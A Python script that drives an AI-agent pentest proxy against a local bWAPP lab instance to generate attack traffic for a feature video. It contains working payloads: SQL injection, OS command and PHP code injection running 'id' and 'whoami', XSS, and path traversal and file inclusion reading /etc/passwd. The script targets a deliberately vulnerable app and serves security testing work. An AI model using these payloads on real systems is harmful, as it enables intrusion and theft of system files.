#!/usr/bin/env python3
"""Dense, continuous attack stream for the feature video.

Drives a steady flow of recon + exploit requests over aitmproxy's MCP bus so the
TUI's flow list visibly streams and the findings counter climbs live. Prints
nothing to the terminal (the TUI is the recorded surface); logs to a file.
"""
import base64
import sys
import time
import urllib.parse as up

sys.path.insert(0, "/Users/matt/Security/aitmproxy/.claude/worktrees/blind-pentest-bwapp-542fcf/bwapp-assessment")
from mcpcli import Bus

AGENT = "f53c2ce661e3992b2824b9d24aed6b899155c4a790056007"
OPERATOR = "064a8a192406bb42a9413881659b2d4e37a70b3698aa508d"
TARGET = "http://127.0.0.1:8088"
AUTH = "127.0.0.1:8088"
POCDIR = "/Users/matt/Security/aitmproxy/.claude/worktrees/blind-pentest-bwapp-542fcf/bwapp-assessment/pocs"
LOG = open("/tmp/claude/feature-driver.log", "w")
GAP = 0.28


def log(*a):
    print(*a, file=LOG, flush=True)


def send(agent, method, path, body=None, cookie=None):
    h = {}
    if cookie:
        h["Cookie"] = cookie
    req = {"method": method, "scheme": "http", "authority": AUTH, "path": path, "headers": h}
    if body is not None:
        h["Content-Type"] = "application/x-www-form-urlencoded"
        req["body"] = body
    fid = agent.call("request.send", req)["result"]["structuredContent"]
    d = agent.call("flow.detail", {"id": fid})["result"]["structuredContent"]
    b = d.get("response", {}).get("body", "")
    try:
        b = base64.b64decode(b).decode("utf-8", "replace")
    except Exception:
        pass
    return fid, b


def g(path):
    return "/" + path if not path.startswith("/") else path


# Recon sweep (fast): touch the surface so flows stream in.
RECON = [
    "/portal.php", "/htmli_get.php", "/sqli_1.php?title=iron&action=search",
    "/xss_get.php?firstname=a&lastname=b&form=submit", "/commandi.php", "/phpi.php",
    "/directory_traversal_1.php?page=message.txt", "/rlfi.php?language=en&action=go",
    "/sqli_6.php", "/htmli_post.php", "/xss_stored_1.php", "/ba_captcha_bypass.php",
]

# Per-class: several payload variants (visible volume), proof substring, PoC, finding meta.
CLASSES = [
    dict(title="HTML Injection - Reflected (GET)", cls="html_injection", sev="medium",
         page="htmli_get.php", poc="01-html-injection.yaml",
         variants=[("GET", (lambda v: "/htmli_get.php?" + up.urlencode({"firstname": v, "lastname": "x", "form": "submit"})), None, v)
                   for v in ["<h1>AITM</h1>", "<b>pwn</b>", "<marquee>x</marquee>", "<h1>AITM-PROOF</h1>"]],
         proof="AITM-PROOF"),
    dict(title="SQL Injection (GET/Search)", cls="sqli", sev="critical",
         page="sqli_1.php", poc="02-sqli-get-search.yaml",
         variants=[("GET", (lambda t: "/sqli_1.php?" + up.urlencode({"title": t, "action": "search"})), None, t)
                   for t in ["'", "1' OR '1'='1", "x' ORDER BY 7-- -",
                             "zz' UNION SELECT 1,concat('AITMSQLi-',version()),3,4,5,6,7-- -"]],
         proof="AITMSQLi-"),
    dict(title="OS Command Injection (RCE)", cls="os_command_injection", sev="critical",
         page="commandi.php", poc="03-os-command-injection.yaml",
         variants=[("POST", "/commandi.php", "target=" + up.quote(c) + "&form=submit")
                   for c in ["www.nsa.gov; whoami", "www.nsa.gov; uname -a", "www.nsa.gov; id"]],
         proof="uid="),
    dict(title="Cross-Site Scripting - Reflected (GET)", cls="xss_reflected", sev="high",
         page="xss_get.php", poc="04-xss-reflected-get.yaml",
         variants=[("GET", (lambda v: "/xss_get.php?" + up.urlencode({"firstname": v, "lastname": "x", "form": "submit"})), None, v)
                   for v in ["<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>",
                             "<script>window.__aitm='PROOF'</script>"]],
         proof="window.__aitm='PROOF'"),
    dict(title="PHP Code Injection (RCE)", cls="php_code_injection", sev="critical",
         page="phpi.php", poc="05-php-code-injection.yaml",
         variants=[("GET", (lambda v: "/phpi.php?" + up.urlencode({"message": v})), None, v)
                   for v in ["5*5", "phpversion()", "system('id')"]],
         proof="uid="),
    dict(title="Directory / Path Traversal", cls="directory_traversal", sev="high",
         page="directory_traversal_1.php", poc="06-directory-traversal.yaml",
         variants=[("GET", (lambda v: "/directory_traversal_1.php?" + up.urlencode({"page": v})), None, v)
                   for v in ["message.txt", "../../etc/hostname", "../../../../../../etc/passwd"]],
         proof="root:"),
    dict(title="Local File Inclusion (RFI/LFI)", cls="local_file_inclusion", sev="high",
         page="rlfi.php", poc="07-local-file-inclusion.yaml",
         variants=[("GET", (lambda v: "/rlfi.php?" + up.urlencode({"language": v, "action": "go"})), None, v)
                   for v in ["en", "../../../../../../etc/hostname", "../../../../../../etc/passwd"]],
         proof="root:"),
]


def mkpath(spec):
    # spec is ("GET"|"POST", pathfn_or_str [, body [, arg]])
    method = spec[0]
    second = spec[1]
    body = spec[2] if len(spec) > 2 else None
    if callable(second):
        arg = spec[3]
        return method, second(arg), body
    return method, second, body


def main():
    agent = Bus(AGENT)
    operator = Bus(OPERATOR)
    operator.call("agent.set", {"policy": "auto"})
    agent.call("agent.status", {})
    agent.call("scope.list", {})

    fid, resp = None, None
    # login
    h = {"Content-Type": "application/x-www-form-urlencoded"}
    lf = agent.call("request.send", {"method": "POST", "scheme": "http", "authority": AUTH,
                                     "path": "/login.php", "headers": h,
                                     "body": "login=bee&password=bug&security_level=0&form=submit"})["result"]["structuredContent"]
    d = agent.call("flow.detail", {"id": lf})["result"]["structuredContent"]
    sess = None
    for k, v in d.get("response", {}).get("headers", []):
        if k.lower() == "set-cookie" and "PHPSESSID=" in v:
            sess = v.split("PHPSESSID=", 1)[1].split(";", 1)[0]
    cookie = "PHPSESSID=%s; security_level=0" % sess
    log("cookie", cookie)

    # recon sweep
    for p in RECON:
        send(agent, "GET", g(p), cookie=cookie)
        time.sleep(GAP)

    # per-class dense attack + confirm + poc + finding
    n = 0
    for c in CLASSES:
        last_fid = None
        confirmed = False
        for spec in c["variants"]:
            method, path, body = mkpath(spec)
            last_fid, rbody = send(agent, method, path, body=body, cookie=cookie)
            if c["proof"] in rbody:
                confirmed = True
            time.sleep(GAP)
        # operator reproduces, agent records the finding -> counter climbs
        pr = operator.call("poc.run", {"poc_path": "%s/%s" % (POCDIR, c["poc"]),
                                       "target": TARGET, "vars": {"cookie": cookie}})
        res = pr.get("result", {}).get("structuredContent", {})
        cap = res.get("finding_capture")
        passed = bool(res.get("passed"))
        agent.call("findings.record", {
            "title": c["title"], "class": c["cls"], "severity": c["sev"],
            "target": "%s/%s" % (TARGET, c["page"]), "poc_ref": c["poc"],
            "flows": [x for x in [last_fid, cap] if x],
            "notes": "Confirmed live via aitmproxy. PoC %s passed." % c["poc"],
            "passed": passed,
        })
        n += 1
        log("finding", n, c["title"], "confirmed=%s poc=%s" % (confirmed, passed))
        time.sleep(0.5)

    lst = agent.call("findings.list", {})["result"]["structuredContent"]
    log("TOTAL findings:", len(lst) if isinstance(lst, list) else "?")
    # let the TUI rest on the final state briefly
    time.sleep(2)


if __name__ == "__main__":
    main()
